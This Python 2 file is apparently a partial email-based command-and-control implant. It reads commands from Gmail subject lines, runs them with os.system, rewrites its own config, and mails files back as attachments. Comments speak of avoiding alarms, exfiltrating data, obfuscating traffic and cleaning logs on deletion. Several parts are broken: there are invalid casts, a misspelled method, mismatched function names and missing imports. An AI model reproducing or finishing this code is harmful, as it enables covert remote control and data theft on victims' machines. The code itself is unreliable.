#! /usr/bin/python
import imaplib
import smtplib
import threading
import email
import os


IMAP_SERVER = "imap.gmail.com"
IMAP_PORT   = 993

config = open("./config", "r+")
waitList = [] # stores commands to be executed, must stay under 2 threads as not to raise the alarms
OSType = "" # received in the config, must be specified within the payload creation
global_update = 0


def execute_command(command_string, attachment):
	if command_string[0:3] == "UPC": #Update the config file with the provided attachemnt
		updateConfig(attachment)
	elif command_string[0:3] == "STT": #get status of system, respond to server
		status_update()
	elif command_string[0:3] == "RUN": #runs a specified module and sends back the updates of running, and exit status + any exfiltrated data
		execute_module(command_string[3:5])
	elif command_string[0:3] == "DEL": #deletes the client itself as well as any leftover modules, as well as cleans logs
		delete_all()


def parse_updates(updates):
	for key in updates:
		try:
			if updates[key][0:4] == my_id:
				command_length = (int)updates[key][4:8]
				update_number = (int)updates[key][8:12]
				if update_number > global_update:
					execute_command(updates[key][12:12+command_length)
			else:
				pass
		except Exception, e:
			print e


def fromConfig():
	raw_config = config.readlines()
	global serverAddr
	global clientAddr
	global clientPass
	global modulesAvailable
	global my_id

	serverAddr = raw_config[0].strip()
	clientAddr = raw_config[1].strip()
	clientPass = raw_config[2].strip()
	modulesAvailable = raw_config[3].strip()
	my_id = raw_config[4].stip()
	return
def image_handler(attachment):
	pass


def attachment_handler(msg):
	for part in msg.walk():
		content_type =  part.get_content_type()
		attachment = part.get_payload()
		if content_type == "text/html":
			print attachment
		elif content_type == "text/plain":
			print attachment
		elif content_type == "image/png":
			image_handler(attachment)
		elif content_type == "mutlipart/alternative":
			pass
		
		print type(attachment)


def readMail(user,upass): #gets a dictionary of Updates/commands from server and passes it to the subject parser
	updates = {}

	server = imaplib.IMAP4_SSL(IMAP_SERVER,IMAP_PORT)
	
	server.login(user,upass)
	server.select("inbox")
	
	type, data = server.search(None, 'ALL')
	mail_ids = data[0]
	
	id_list = mail_ids.split()
	
	first_id = int(id_list[0])
	
	latest_id = int(id_list[-1])
	#print latest_id


	for i in range(latest_id, first_id, -1):
		typ, data = server.fetch(i, '(RFC822)')
		#print data
		for response_part in data:
			if isinstance(response_part, tuple):
				msg = email.message_from_string(response_part[1])
				#print msg
				email_subject = msg['subject']
				email_from = msg['from']
				print email_subject
				print email_from
				updates[i] = email_subject
				#if msg.is_multipart():
				#	for part in msg.walk():
				#		print part.get_content_type()
				if msg.is_multipart():
					attachment_handler(msg)
	return updates


def executeModule(moduleNum): #runs the specified module and generates a report back to the server
	os.system(moduleNum)
	pass
def sendReport(moduleNum, status, exifData): #sends an update to the server with the module number, if it succeeded or not
	pass
def newKey(): #when the newKey command is sent from the server along with the generated key, this integrates it into communication and sends back the old key in the "OK"
	pass
def encryptRSA(key, payload):
  publicKey = key.publickey()
  return publicKey.encrypt(payload)

def decryptRSA(key, payload):
  return key.decrypt(payload)

def getKeys(privatePath, publicPath):
  pub = open(dir + publicPath, 'w+')
  pri = open(dir + privatePath, 'w+')

  key = generateKey()

  pub.write(key.publickey().export_key('PEM'))
  pri.write(key.export_key('PEM'))

  pub.close()
  pri.close()

  return key
def updateConfig(newConfig): #updates the config to replace an old email, or update the modules list
	try:
		config.truncate(0)
		for line in newConfig:
			config.write(line)
		return 1
	except Exception, e:
		return e
	pass

def mailSender(reUser, seUser,sePass,subject,text,files): #the actual sending of the email is handled here, fragmenting and obfuscation done elsewhere

	email_text = """\
From: %s
To: %s
Subject: %s

%s
""" % (seUser, reUser, subject, text)

	msg = MIMEMultipart()
	msg['From'] = seUser
	msg['To'] = reUser
	msg['Subject'] = subject

	msg.attach(MIMEText(text))

	for f in files or []:
		with open(f, "rb") as fil:
			part = MIMEApplication(fil.read(),Name=basename(f)
			)
	part['Content-Disposition'] = 'attachment; filename="%s"' % basename(f)
	msg.attach(part)
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.ehlo()
	server.starttls()

	server.login(seUser, sePass)
	server.sendmail(seUser, reUser, msg.as_string())


def main():
	fromConfig()
	parse_updates(readMail(clientAddr, clientPass))
	pass
main()